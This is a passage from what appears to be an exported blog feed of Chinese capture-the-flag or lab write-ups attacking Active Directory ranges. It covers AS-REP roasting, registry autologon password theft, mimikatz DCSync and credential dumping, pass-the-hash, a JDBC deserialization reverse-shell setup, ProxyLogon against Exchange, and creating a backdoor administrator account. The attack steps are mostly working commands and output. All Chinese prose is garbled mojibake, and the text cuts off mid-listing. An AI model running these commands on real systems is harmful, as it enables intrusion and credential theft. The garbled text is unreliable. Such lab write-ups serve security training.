class="line">linxi</span><br><span class="line">zoufu</span><br><span class="line">qianqing</span><br><span class="line">qiai</span><br><span class="line">ruilin</span><br><span class="line">luomeng</span><br><span class="line">huaren</span><br><span class="line">yanyangmei</span><br><span class="line">zuofen</span><br><span class="line">manyuan</span><br><span class="line">yuhui</span><br><span class="line">sunli</span><br><span class="line">guansixin</span><br><span class="line">ruisong</span><br><span class="line">qiruo</span><br><span class="line">jinyu</span><br><span class="line">shoujuan</span><br><span class="line">yanqian</span><br><span class="line">changyun</span><br><span class="line">hualu</span><br><span class="line">huanming</span><br><span class="line">baoshao</span><br><span class="line">hongmei</span><br><span class="line">manyun</span><br><span class="line">changwan</span><br><span class="line">wangyan</span><br><span class="line">shijian</span><br><span class="line">ruibei</span><br><span class="line">jingshao</span><br><span class="line">jinzhi</span><br><span class="line">yuhui</span><br><span class="line">zangpeng</span><br><span class="line">changyun</span><br><span class="line">yetai</span><br><span class="line">luoxue</span><br><span class="line">moqian</span><br><span class="line">xupeng</span><br><span class="line">ruanyong</span><br><span class="line">guliangxian</span><br><span class="line">yinbin</span><br><span class="line">huarui</span><br><span class="line">niuya</span><br><span class="line">guwei</span><br><span class="line">qinguan</span><br><span class="line">yangdanhan</span><br><span class="line">yingjun</span><br><span class="line">weiwan</span><br><span class="line">sunduangu</span><br><span class="line">sisiwu</span><br><span class="line">nongyan</span><br><span class="line">xuanlu</span><br><span class="line">yunzhong</span><br><span class="line">gengfei</span><br><span class="line">zizhuansong</span><br><span class="line">ganbailong</span><br><span class="line">shenjiao</span><br><span class="line">zangyao</span><br><span class="line">yangdanhe</span><br><span class="line">chengliang</span><br><span class="line">xudi</span><br><span class="line">wulun</span><br><span class="line">yuling</span><br><span class="line">taoya</span><br><span class="line">jinle</span><br><span class="line">youchao</span><br><span class="line">liangduanzhi</span><br><span class="line">jiagupiao</span><br><span class="line">ganze</span><br><span class="line">jiangqing</span><br><span class="line">jinshan</span><br><span class="line">zhengpubei</span><br><span class="line">cuicheng</span><br><span class="line">qiyong</span><br><span class="line">qizhu</span><br><span class="line">ganjian</span><br><span class="line">yurui</span><br><span class="line">feishu</span><br><span class="line">chenxin</span><br><span class="line">shengzhe</span><br><span class="line">wohong</span><br><span class="line">manzhi</span><br><span class="line">xiangdong</span><br><span class="line">weihui</span><br><span class="line">xingquan</span><br><span class="line">miaoshu</span><br><span class="line">gongwan</span><br><span class="line">qijie</span><br><span class="line">shaoting</span><br><span class="line">xiqi</span><br><span class="line">jinghong</span><br><span class="line">qianyou</span><br><span class="line">chuhua</span><br><span class="line">yanyue</span><br><span class="line">huangjia</span><br><span class="line">zhouchun</span><br><span class="line">jiyu</span><br><span class="line">wendong</span><br><span class="line">heyuan</span><br><span class="line">mazhen</span><br><span class="line">shouchun</span><br><span class="line">liuzhe</span><br><span class="line">fengbo</span><br><span class="line">taigongyuan</span><br><span class="line">gesheng</span><br><span class="line">songming</span><br><span class="line">yuwan</span><br><span class="line">diaowei</span><br><span class="line">youyi</span><br><span class="line">rongxianyu</span><br><span class="line">fuyi</span><br><span class="line">linli</span><br><span class="line">weixue</span><br><span class="line">hejuan</span><br><span class="line">zuoqiutai</span><br><span class="line">siyi</span><br><span class="line">shenshan</span><br><span class="line">tongdong</span><br></pre></td></tr></table></figure><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>æšä¸¾æœªè®¾ç½®é¢„è®¤è¯çš„è´¦å·ï¼ˆè¿™ä¸ªä¸œè¥¿é»˜è®¤æ˜¯ä¸å…³é—­çš„ï¼Œä½†å½“å…³é—­äº†é¢„èº«ä»½éªŒè¯åï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æŒ‡å®šç”¨æˆ·å‘åŸŸæ§åˆ¶å™¨çš„Kerberos 88ç«¯å£è¯·æ±‚ç¥¨æ®ï¼Œæ­¤æ—¶åŸŸæ§ä¸ä¼šè¿›è¡Œä»»ä½•éªŒè¯å°±å°†TGTå’Œè¯¥ç”¨æˆ·HashåŠ å¯†çš„Login Session Key è¿”å›ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å°±å¯ä»¥å¯¹è·å–åˆ°çš„ç”¨æˆ·HashåŠ å¯†çš„ Login Session Key è¿›è¡Œç¦»çº¿ç ´è§£ï¼Œå¦‚æœå­—å…¸å¤Ÿå¼ºå¤§ï¼Œåˆ™å¯èƒ½ç ´è§£å¾—åˆ°è¯¥æŒ‡å®šç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741604568897-86252319-c679-4cc1-8510-860ada3849cd.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$zhangxin@XIAORANG.LAB:242c7ffb191eb27c46ba4684bb79342c$255c08173063dfb9c4f8bcdb9ee8210959239f9c358479b88d9209af53042a07ebb9816b0d093657357b549ad177956396ee692bcefbc1731b992bc1039b6ecbaab3899549cf3beb1fb400efc447b6f7a552ee3519ba2912ab784ed1246dae3625f30292380c088ee5d9458fe7d88d1a1312a662ad35c6cf6d079ed56d3a224b9ab5a20c820205401e1bb586b9f899f44fd66b0fb6994e64c79bab1ac07bcfcb3f118d26ee4cac2d255656c82854952bc7102ee202d1d1a5e404f6bd469344b5a8b0400f415f6293f9ac22c3c132fd6f902d8b97b10e1a238110d0798c3848f2ca96480ccb7906526d113b88</span><br></pre></td></tr></table></figure><p>çˆ†ç ´ä¸€ä¸‹å¯†ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741604733212-eabb0a9d-508c-4ce7-95b0-647ba282d085.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strawberry       ($krb5asrep$23$zhangxin@XIAORANG.LAB)     </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhangxin@XIAORANG.LAB:strawberry</span><br></pre></td></tr></table></figure><p>rdpéƒ½è¯•è¯•å‘ç°6.25å¯ä»¥</p><p>ç™»ä¸Šå»ä¹‹åçœ‹ä¸€ä¸‹ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure><h2 id="è‡ªåŠ¨ç™»å½•"><a href="#è‡ªåŠ¨ç™»å½•" class="headerlink" title="è‡ªåŠ¨ç™»å½•"></a>è‡ªåŠ¨ç™»å½•</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741604951402-1481173e-b192-4e18-b6eb-bebc4f22ce0f.png">è¿™é‡Œæ€€ç–‘è‡ªåŠ¨ç™»å½•ï¼ˆç”¨æˆ·ä¸è®¡ç®—æœºæ—¶è¿›è¡Œä¼šè¯æ—¶ï¼Œå‡­æ®ä¼šä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œè¯´æ˜yuxuanè¿™ä¸ªç”¨æˆ·ç™»å½•è¿‡WIN2019ï¼Œå¾ˆå¤šç”¨æˆ·ä¹ æƒ¯å°†è®¡ç®—æœºè®¾ç½®è‡ªåŠ¨ç™»å½•ï¼‰ï¼ŒæŠ“ä¸€ä¸‹å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DefaultUserName    REG_SZ    yuxuan</span><br><span class="line">DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class="line">DefaultDomainName    REG_SZ    xiaorang.lab</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·åœ¨ç™»å½•ï¼Œä¼ ä¸ªSharpHoundåˆ†æä¸€ä¸‹åŸŸå†…ç¯å¢ƒï¼Œæœ‰ä¸¤ä¸ªç‰ˆæœ¬</p><p><a href="https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># äºŒè¿›åˆ¶é‡‡é›†å·¥å…·å‘½ä»¤ï¼š</span><br><span class="line">SharpHound.exe -c all</span><br><span class="line"># powershellé‡‡é›†å·¥å…·å‘½ä»¤ï¼š</span><br><span class="line">powershell -exec bypass -command &quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</span><br></pre></td></tr></table></figure><p>kaliå¯åŠ¨ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br><span class="line">./BloodHound --no-sandbox</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741605542088-7ffa1004-ff83-4e45-94d1-2e72b12acaab.png"></p><h2 id="SIDHistoryæ»¥ç”¨"><a href="#SIDHistoryæ»¥ç”¨" class="headerlink" title="SIDHistoryæ»¥ç”¨"></a>SIDHistoryæ»¥ç”¨</h2><p>ç”¨æˆ·æ»¥ç”¨äº†SIDå†å²åŠŸèƒ½(SIDHistoryæ˜¯ä¸€ä¸ªä¸ºæ”¯æŒåŸŸè¿ç§»æ–¹æ¡ˆè€Œè®¾ç½®çš„å±æ€§ï¼Œå½“ä¸€ä¸ªå¯¹è±¡ä»ä¸€ä¸ªåŸŸè¿ç§»åˆ°å¦ä¸€ä¸ªåŸŸæ—¶ï¼Œä¼šåœ¨æ–°åŸŸåˆ›å»ºä¸€ä¸ªæ–°çš„SIDä½œä¸ºè¯¥å¯¹è±¡çš„objectSidï¼Œåœ¨ä¹‹å‰åŸŸä¸­çš„SIDä¼šæ·»åŠ åˆ°è¯¥å¯¹è±¡çš„sIDHistoryå±æ€§ä¸­ï¼Œæ­¤æ—¶è¯¥å¯¹è±¡å°†ä¿ç•™åœ¨åŸæ¥åŸŸçš„SIDå¯¹åº”çš„è®¿é—®æƒé™)</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741606515322-9722af20-41ed-45a9-9700-5b42e6f0203c.png"></p><p>ç”¨BloodHoundåˆ†æåŸŸå†…å…³ç³»ï¼Œå‘ç°è¿™ä¸ªç”¨æˆ·æ»¥ç”¨äº†SIDå†å²åŠŸèƒ½(SIDHistoryæ˜¯ä¸€ä¸ªä¸ºæ”¯æŒåŸŸè¿ç§»æ–¹æ¡ˆè€Œè®¾ç½®çš„å±æ€§ï¼Œå½“ä¸€ä¸ªå¯¹è±¡ä»ä¸€ä¸ªåŸŸè¿ç§»åˆ°å¦ä¸€ä¸ªåŸŸæ—¶ï¼Œä¼šåœ¨æ–°åŸŸåˆ›å»ºä¸€ä¸ªæ–°çš„SIDä½œä¸ºè¯¥å¯¹è±¡çš„objectSidï¼Œåœ¨ä¹‹å‰åŸŸä¸­çš„SIDä¼šæ·»åŠ åˆ°è¯¥å¯¹è±¡çš„sIDHistoryå±æ€§ä¸­ï¼Œæ­¤æ—¶è¯¥å¯¹è±¡å°†ä¿ç•™åœ¨åŸæ¥åŸŸçš„SIDå¯¹åº”çš„è®¿é—®æƒé™)</p><p>åœ¨yuxuanä¸ŠğŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741607560577-3c066389-2ff8-4d07-b42c-16d34c451d2e.png"></p><p>ç›´æ¥æŠ“hashï¼Œç”¨çŒ•çŒ´æ¡ƒä¹Ÿè¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741607574482-558cfd68-ffd7-4d34-9254-6e6977be363b.png"></p><p>æŠ“åˆ°adminçš„hashï¼Œæ¥ç€æ‰“pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec  XIAORANG/administrator@172.22.6.25   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec  XIAORANG/administrator@172.22.6.12   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag*</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Exchange</title>
      <link href="/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/"/>
      <url>/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/</url>
      
        <content type="html"><![CDATA[<p>fscanæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.99.152.160:80 open</span><br><span class="line">39.99.152.160:22 open</span><br><span class="line">39.99.152.160:8000 open</span><br></pre></td></tr></table></figure><p>8000ç«¯å£admin&#x2F;123456å¼±å£ä»¤ä¸Šå»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741675729105-5486e3d0-d278-491d-ba63-0ac4169105e3.png"></p><h2 id="åå¤erpååºåˆ—åŒ–"><a href="#åå¤erpååºåˆ—åŒ–" class="headerlink" title="åå¤erpååºåˆ—åŒ–"></a>åå¤erpååºåˆ—åŒ–</h2><p>å‘ç°æ²¡æœ‰åå°æ´ï¼Œæ‰“jdbcï¼Œå‚è€ƒï¼š<a href="https://www.cnblogs.com/kingbridge/articles/16720318.html">https://www.cnblogs.com/kingbridge/articles/16720318.html</a></p><p>vpsä¸Šèµ·ä¸€ä¸ªmysqlæœåŠ¡<a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>config.jsoné…ç½®(<a href="https://github.com/frohoff/ysoserial">ysoserial-all.jar</a>å’Œserver.pyæ”¾ä¸€èµ·)ï¼Œbash -cåé¢æ›¿æ¢æˆbase64ååå¼¹shellçš„payloadï¼Œå…¶ä»–ç…§æŠ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;config&quot;:&#123;</span><br><span class="line">            &quot;ysoserialPath&quot;:&quot;ysoserial-all.jar&quot;,</span><br><span class="line">            &quot;javaBinPath&quot;:&quot;java&quot;,</span><br><span class="line">            &quot;fileOutputDir&quot;:&quot;./fileOutput/&quot;,</span><br><span class="line">            &quot;displayFileContentOnScreen&quot;:true,</span><br><span class="line">            &quot;saveToFile&quot;:true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;fileread&quot;:&#123;</span><br><span class="line">            &quot;win_ini&quot;:&quot;c:\\windows\\win.ini&quot;,</span><br><span class="line">            &quot;win_hosts&quot;:&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;,</span><br><span class="line">            &quot;win&quot;:&quot;c:\\windows\\&quot;,</span><br><span class="line">            &quot;linux_passwd&quot;:&quot;/etc/passwd&quot;,</span><br><span class="line">            &quot;linux_hosts&quot;:&quot;/etc/hosts&quot;,</span><br><span class="line">            &quot;index_php&quot;:&quot;index.php&quot;,</span><br><span class="line">            &quot;ssrf&quot;:&quot;https://www.baidu.com/&quot;,</span><br><span class="line">            &quot;__defaultFiles&quot;:[&quot;/etc/hosts&quot;,&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;yso&quot;:&#123;</span><br><span class="line">            &quot;Jdk7u21&quot;:[&quot;Jdk7u21&quot;,&quot;calc&quot;],</span><br><span class="line">            &quot;CommonsCollections6&quot;:[&quot;CommonCollections6&quot;,&quot;bash -c &#123;echo,base64åå¼¹shell&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3 server.pyå¯åŠ¨æœåŠ¡ã€‚</p><p>ç„¶åå‘ç½‘ç«™è¯·æ±‚çš„payloadå°±æ˜¯ä¸‹é¢è¿™ä¸ªurlç¼–ç åçš„,æŠ“ä¸ªåŒ…æ”¹ä¸€ä¸‹è·¯å¾„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677148720-6fb686b6-f410-4743-9c92-282faaaec622.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag/flag01.txt</span><br></pre></td></tr></table></figure><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>æ¥ä¸‹æ¥æ‰“å†…ç½‘ï¼Œå…ˆä¸Šä»£ç†å’Œfscan</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677425069-fb448b2f-be65-4fb4-91f7-f45e1b5154c8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.3.12     is alive</span><br><span class="line">(icmp) Target 172.22.3.2      is alive</span><br><span class="line">(icmp) Target 172.22.3.9      is alive</span><br><span class="line">(icmp) Target 172.22.3.26     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.3.12:8000 open</span><br><span class="line">172.22.3.9:445 open</span><br><span class="line">172.22.3.26:445 open</span><br><span class="line">172.22.3.2:445 open</span><br><span class="line">172.22.3.9:443 open</span><br><span class="line">172.22.3.9:139 open</span><br><span class="line">172.22.3.26:139 open</span><br><span class="line">172.22.3.2:139 open</span><br><span class="line">172.22.3.9:135 open</span><br><span class="line">172.22.3.26:135 open</span><br><span class="line">172.22.3.2:135 open</span><br><span class="line">172.22.3.9:81 open</span><br><span class="line">172.22.3.9:80 open</span><br><span class="line">172.22.3.2:88 open</span><br><span class="line">172.22.3.12:80 open</span><br><span class="line">172.22.3.12:22 open</span><br><span class="line">172.22.3.9:8172 open</span><br><span class="line">172.22.3.9:808 open</span><br><span class="line">[*] alive ports len is: 18</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.9</span><br><span class="line">   [-&gt;]XIAORANG-EXC01</span><br><span class="line">   [-&gt;]172.22.3.9</span><br><span class="line">[*] WebTitle http://172.22.3.12        code:200 len:19813  title:lumia</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.2</span><br><span class="line">   [-&gt;]XIAORANG-WIN16</span><br><span class="line">   [-&gt;]172.22.3.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.26</span><br><span class="line">   [-&gt;]XIAORANG-PC</span><br><span class="line">   [-&gt;]172.22.3.26</span><br><span class="line">[*] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC          </span><br><span class="line">[*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.3.12:8000   code:302 len:0      title:None è·³è½¬url: http://172.22.3.12:8000/login.html</span><br><span class="line">[*] OsInfo 172.22.3.2   (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP</span><br><span class="line">[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         eWindows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.3.9:81      code:403 len:1157   title:403 - ç¦æ­¢è®¿é—®: è®¿é—®è¢«æ‹’ç»ã€‚</span><br><span class="line">[*] WebTitle https://172.22.3.9:8172   code:404 len:0      title:None</span><br><span class="line">[*] WebTitle http://172.22.3.9         code:403 len:0      title:None</span><br><span class="line">[*] WebTitle https://172.22.3.9        code:302 len:0      title:None è·³è½¬url: https://172.22.3.9/owa/</span><br><span class="line">[*] WebTitle https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 code:200 len:28237  title:Outlook</span><br><span class="line">å·²å®Œæˆ 18/18</span><br><span class="line">[*] æ‰«æç»“æŸ,è€—æ—¶: 11.337402915s</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.3.12     å½“å‰æœºå™¨</span><br><span class="line">172.22.3.9      åŸŸå†…Exchangeæœº</span><br><span class="line">172.22.3.2      åŸŸæ§</span><br><span class="line">172.22.3.26     åŸŸå†…æœºå™¨</span><br></pre></td></tr></table></figure><p>172.22.3.9è®¿é—®ä¸€ä¸‹å‘ç°æ˜¯Exchange Server 2016, ç›´æ¥æ‰“<a href="https://github.com/hausec/ProxyLogon">ProxyLogon</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677739859-ab1feed1-0099-4700-987e-1c5f7e3dab06.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p>æ‰“å®Œä¼šå¼¹ä¸€ä¸ªsystemçš„Shellï¼Œæˆ‘ä»¬æ·»åŠ ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user calm qwer1234! /add</span><br><span class="line">net localgroup administrators calm /add</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677900628-aeb0f513-da0f-45de-a19c-eb1a123e8dcd.png"></p><p>rdpä¸Šå»æ‹¿flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677998198-941d6af2-b085-4420-9f41-75c9ce546bef.png"></p><p>ä¸ŠçŒ•çŒ´æ¡ƒæŠ“ä¸€ä¸‹å¯†ç ï¼Œè®°å¾—ç®¡ç†å‘˜è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 